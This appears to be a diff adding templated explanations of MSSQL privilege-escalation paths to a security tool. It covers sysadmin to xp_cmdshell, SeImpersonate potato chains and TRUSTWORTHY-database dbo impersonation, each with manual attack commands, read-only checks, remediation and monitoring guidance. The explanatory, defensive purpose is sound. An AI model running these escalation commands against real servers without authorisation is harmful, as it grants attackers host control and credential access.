+            "Identify the SQL Server service account and confirm sysadmins on the "
+            "instance (the escalation prerequisite):\n"
+            "Get-CimInstance Win32_Service -ComputerName {target} |\n"
+            "  Where-Object {{ $_.Name -like 'MSSQL*' }} |\n"
+            "  Select-Object Name, StartName\n"
+            "# In SQL: SELECT p.name FROM sys.server_role_members r JOIN sys.server_principals p\n"
+            "#   ON r.member_principal_id = p.principal_id WHERE r.role_principal_id = \n"
+            "#   (SELECT principal_id FROM sys.server_principals WHERE name='sysadmin');"
+        ),
+        "verify_linux": (
+            "Read-only check of MSSQL access and privilege for the account (no "
+            "escalation run):\n"
+            "impacket-mssqlclient -k <domain>/<user>@{target} -windows-auth "
+            "-command \"SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');\"\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/mssql"
+        ),
+        "remediation": (
+            "Run the SQL Server service under a low-privileged Group Managed Service Account, and keep xp_cmdshell disabled (EXEC sp_configure 'xp_cmdshell',0; RECONFIGURE;) so a sysadmin foothold cannot spawn OS commands as the service account in the first place.",
+            "Restrict membership of the SQL sysadmin server role to the minimum: audit it (SELECT p.name FROM sys.server_role_members r JOIN sys.server_principals p ON r.member_principal_id = p.principal_id) and remove application/service logins that do not need it.",
+            "Because this path survives removing SeImpersonate, also isolate the SQL host: enforce tier separation so no privileged logon session an attacker could steal a token from exists on the database server, and apply the latest OS patches.",
+            "Monitor Event IDs 4688 (process creation under the SQL service account), 7045 (service install), and 5145 (share access) on the SQL host, plus SQL error-log entries for xp_cmdshell configuration changes.",
+        ),
+    },
+    "mssql_seimpersonate_escalation": {
+        "short": (
+            "{source} escalates from MSSQL sysadmin on {target} to NT AUTHORITY\\"
+            "SYSTEM by abusing the SQL service account's SeImpersonatePrivilege via "
+            "an in-memory CLR potato chain."
+        ),
+        "long": (
+            "The SQL Server service account runs with SeImpersonatePrivilege by "
+            "default, which permits impersonating a token handed to it. Once "
+            "{source} holds sysadmin on the MSSQL instance on {target}, it can load "
+            "a CLR (.NET) assembly directly into SQL Server memory as a hexadecimal "
+            "literal — no file is written to disk, which sidesteps write-time AV — "
+            "and use it to run a 'potato' coercion (for example RPCSS or DCOM/BITS "
+            "local coercion) that yields a SYSTEM token, which SeImpersonate then "
+            "lets it assume. The outcome is NT AUTHORITY\\SYSTEM on the database "
+            "server: full host control, credential harvesting, and use of the "
+            "machine account for domain actions. This is the classic MSSQL-to-SYSTEM "
+            "path and depends on the SQL service account still holding "
+            "SeImpersonatePrivilege (the token-theft variant covers the case where "
+            "it has been removed). The prerequisite is sysadmin on the SQL Server "
+            "instance."
+        ),
+        "manual": (
+            "# With MSSQL sysadmin, confirm command execution as the SQL service\n"
+            "# account (which holds SeImpersonatePrivilege), then run the potato chain:\n"
+            "impacket-mssqlclient -k <domain>/<user>@{target} -windows-auth\n"
+            "#   SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;\n"
+            "#   SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\n"
+            "#   SQL> EXEC xp_cmdshell 'whoami /priv';   -- shows SeImpersonatePrivilege Enabled"
+        ),
+        "verify_windows": (
+            "Confirm the SQL service account holds SeImpersonatePrivilege (the "
+            "escalation prerequisite):\n"
+            "Get-CimInstance Win32_Service -ComputerName {target} |\n"
+            "  Where-Object {{ $_.Name -like 'MSSQL*' }} |\n"
+            "  Select-Object Name, StartName\n"
+            "# On the host, as/for that service account: whoami /priv | findstr "
+            "SeImpersonatePrivilege"
+        ),
+        "verify_linux": (
+            "Read-only check of MSSQL sysadmin membership for the account (no "
+            "escalation run):\n"
+            "impacket-mssqlclient -k <domain>/<user>@{target} -windows-auth "
+            "-command \"SELECT IS_SRVROLEMEMBER('sysadmin');\"\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/mssql"
+        ),
+        "remediation": (
+            "Run the SQL Server service under a low-privileged Group Managed Service Account and, where the workload allows, remove SeImpersonatePrivilege from that account via the 'Impersonate a client after authentication' user-right GPO so the potato escalation has nothing to abuse.",
+            "Keep xp_cmdshell and CLR integration disabled unless explicitly required (EXEC sp_configure 'xp_cmdshell',0; EXEC sp_configure 'clr enabled',0; RECONFIGURE;) so a sysadmin foothold cannot load an in-memory assembly or spawn OS commands.",
+            "Minimise SQL sysadmin membership (audit sys.server_role_members) and keep the database host fully patched so the local coercion primitives the potato chain relies on are closed.",
+            "Monitor Event IDs 4688 (process creation under the SQL service account) and 7045, and SQL error-log entries for CLR/xp_cmdshell configuration changes, which indicate the escalation being staged.",
+        ),
+    },
+    "mssql_trustworthy_db_escalation": {
+        "short": (
+            "A TRUSTWORTHY database owned by a sysadmin on {target} lets {source} "
+            "with db_owner rights impersonate dbo and gain effective SQL sysadmin "
+            "through EXECUTE AS."
+        ),
+        "long": (
+            "When a database's TRUSTWORTHY property is ON and the database is owned "
+            "by a login that is a member of the sysadmin server role, the security "
+            "boundary between the database and the instance collapses. {source}, "
+            "holding db_owner rights in that database (or able to run EXECUTE AS "
+            "USER = 'dbo'), can impersonate the dbo user; because dbo maps to the "
+            "sysadmin-owning login and TRUSTWORTHY lets the impersonation context "
+            "cross into the server scope, the impersonated context has effective "
+            "sysadmin over the whole instance. From effective sysadmin, {source} can "
+            "add itself to the sysadmin role, enable xp_cmdshell, and run OS commands "
+            "on {target}. The escalation is confirmed in practice with "
+            "IS_SRVROLEMEMBER('sysadmin') returning 1 inside the impersonation "
+            "context. It is a configuration flaw (TRUSTWORTHY + sysadmin owner), not "
+            "a protocol bug: the fix is to remove one of the two conditions. The "
+            "prerequisite is db_owner (or equivalent) in a database that meets both "
+            "conditions."
+        ),
+        "manual": (
+            "# In a TRUSTWORTHY db owned by a sysadmin, impersonate dbo to gain\n"
+            "# effective server sysadmin, then enable command execution:\n"
+            "impacket-mssqlclient -k <domain>/<user>@{target} -windows-auth\n"
+            "#   SQL> USE <trustworthy_db>; EXECUTE AS USER = 'dbo';\n"
+            "#   SQL> SELECT IS_SRVROLEMEMBER('sysadmin');   -- returns 1\n"
+            "#   SQL> EXEC sp_addsrvrolemember '<your_login>','sysadmin';"
+        ),
+        "verify_windows": (
+            "Find databases that are both TRUSTWORTHY and owned by a sysadmin login "
+            "— the two conditions that create the escalation:\n"
+            "Invoke-Sqlcmd -ServerInstance {target} -Query \"SELECT d.name, "
+            "d.is_trustworthy_on, sp.name AS owner FROM sys.databases d JOIN "
+            "sys.server_principals sp ON d.owner_sid = sp.sid WHERE "
+            "d.is_trustworthy_on = 1 AND IS_SRVROLEMEMBER('sysadmin', sp.name) = 1;\""
+        ),
+        "verify_linux": (
+            "Read-only query for TRUSTWORTHY databases owned by a sysadmin (no "
+            "escalation performed):\n"
+            "impacket-mssqlclient -k <domain>/<user>@{target} -windows-auth "
+            "-command \"SELECT name, is_trustworthy_on FROM sys.databases WHERE "
+            "is_trustworthy_on = 1;\"\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/mssql"
+        ),
+        "remediation": (
+            "Turn off TRUSTWORTHY on every database that does not strictly require it (ALTER DATABASE <db> SET TRUSTWORTHY OFF;) — this alone breaks the escalation, and most databases never need it.",
+            "Where TRUSTWORTHY is genuinely required, change the database owner to a low-privileged login that is NOT a member of the sysadmin role (ALTER AUTHORIZATION ON DATABASE::<db> TO <low_priv_login>;) so impersonating dbo confers no server-level rights.",
+            "Audit the two conditions together across the instance: SELECT d.name, d.is_trustworthy_on, sp.name FROM sys.databases d JOIN sys.server_principals sp ON d.owner_sid = sp.sid WHERE d.is_trustworthy_on = 1; and remediate every row.",
+            "Keep xp_cmdshell disabled and minimise db_owner grants; monitor SQL error-log and Extended Events for ALTER SERVER ROLE / sp_addsrvrolemember calls that would signal the escalation being used.",
+        ),
+    },
+    "sqladmin": {
+        "short": (
+            "{source} holds sysadmin over the MSSQL instance on {target}, giving it "
+            "full control of the database server and, via xp_cmdshell, OS command "
+            "execution on the host."
+        ),
+        "long": (
+            "SQL Server sysadmin is total control of the database instance: read and "
+            "write every database, reconfigure the server, and — decisively for "
+            "domain compromise — enable and run xp_cmdshell, which executes OS "
+            "commands on {target} in the context of the SQL Server service account. "
+            "When {source_type} {source} is a sysadmin on the instance (directly, "
+            "through a Windows group mapped to a sysadmin login, or via a linked-"
+            "server chain), it can turn database control into host code execution and "
+            "from there escalate to SYSTEM. Sysadmin is often granted too broadly — "
+            "an application account, a Windows group, or BUILTIN\\Administrators "
+            "mapped in — so this access frequently exists without anyone intending a "
+            "domain-reachable admin to hold it. The follow-on escalations "
+            "(SeImpersonate potato, token theft, TRUSTWORTHY-db abuse) all start from "
+            "this foothold. The prerequisite is a sysadmin login on the SQL Server "
+            "instance."
+        ),
+        "manual": (
+            "# Confirm sysadmin, then enable and use xp_cmdshell for OS execution:\n"
+            "impacket-mssqlclient -k <domain>/<user>@{target} -windows-auth\n"
+            "#   SQL> SELECT IS_SRVROLEMEMBER('sysadmin');   -- returns 1\n"
+            "#   SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;\n"
+            "#   SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\n"
+            "#   SQL> EXEC xp_cmdshell 'whoami';"
+        ),
+        "verify_windows": (
+            "List the members of the SQL sysadmin server role and the Windows "
+            "principals mapped to sysadmin logins:\n"
+            "Invoke-Sqlcmd -ServerInstance {target} -Query \"SELECT p.name, p.type_desc "
+            "FROM sys.server_role_members r JOIN sys.server_principals p ON "
+            "r.member_principal_id = p.principal_id WHERE r.role_principal_id = "
+            "SUSER_ID('sysadmin');\"\n"
+            "# Confirm xp_cmdshell state:\n"
+            "Invoke-Sqlcmd -ServerInstance {target} -Query \"SELECT name, value_in_use "
+            "FROM sys.configurations WHERE name = 'xp_cmdshell';\""
+        ),
+        "verify_linux": (
+            "Read-only check of whether the account is a SQL sysadmin (no command "
+            "run):\n"
+            "impacket-mssqlclient -k <domain>/<user>@{target} -windows-auth "
+            "-command \"SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');\"\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/mssql"
+        ),
+        "remediation": (
+            "Audit the SQL sysadmin server role and remove every principal that does not require it — especially application logins, Windows groups, and any BUILTIN\\Administrators mapping: SELECT p.name FROM sys.server_role_members r JOIN sys.server_principals p ON r.member_principal_id = p.principal_id WHERE r.role_principal_id = SUSER_ID('sysadmin');.",
+            "Keep xp_cmdshell disabled (EXEC sp_configure 'xp_cmdshell',0; RECONFIGURE;) so a sysadmin foothold cannot execute OS commands, and grant applications the least database role they need rather than sysadmin.",
+            "Run the SQL Server service under a low-privileged gMSA and enforce tier separation on the database host so that even OS execution as the service account does not reach privileged credentials.",
+            "Monitor SQL logins to the sysadmin role and Event ID 4688 on the host for xp_cmdshell child processes; alert on sp_addsrvrolemember calls adding a login to sysadmin.",
+        ),
+    },
+    # END Tier-2 didactic overlays.
 }
 
 
